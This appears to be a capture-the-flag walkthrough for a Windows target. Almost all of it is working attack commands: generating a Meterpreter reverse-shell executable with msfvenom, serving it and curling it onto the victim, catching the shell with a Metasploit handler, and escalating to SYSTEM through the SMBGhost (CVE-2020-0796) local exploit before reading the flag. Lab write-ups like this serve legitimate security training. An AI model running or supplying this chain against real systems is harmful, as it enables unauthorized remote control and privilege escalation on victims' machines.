# Guide

1 - On your */home/[user]/* of your attacker machine, do :

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[HOST_IP] LPORT=443 -a x64 --platform Windows -f exe -o meter64.exe
```

2 - Launch a HTTP server on your attacker machine :
```
python3 -m http.server 8080
```

3 - Curl the file *meter64.exe* on your victim machine :

```
curl http://[HOST_IP]:8080/meter64.exe --output meter64.exe
```

4 - On your attacker machine, do :

```
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST [HOST_IP];set LPORT 443;exploit;"
```

5 - On your victim machine, execute *meter64.exe* to open a reverse shell on your attacker machine :

```
meter64.exe
```

6 - On your attacker machine, in the reverse shell, do :

```
getuid
```

You can see you are the default user you are connected to on the victim machine.

7 - On your attacker machine, in the reverse shell, do :

```
background
```

It will drop out the meterpreter session.

8 - On your attacker machine, do :

```
search exploit/windows/local/cve
```

It will display some exploits.

```
use exploit/windows/local/cve_2020_0796_smbghost
```

This is the cve that we want to exploit.

```
set SESSION 1
set LHOST [HOST_IP]
set LPORT 8080
```

It will set options.

To verify your options :
```
show options
```

To exploit :
```
exploit
```

It will open a reverse shell. Then, do :

```
getuid
```

You can see you are logged on as the system !

Now, you can navigate to the admin documents to have the flag :

```
cd ..
cd ..
cd Users
cd admin
cd Documents
cat flag.txt
```

Congratulations !
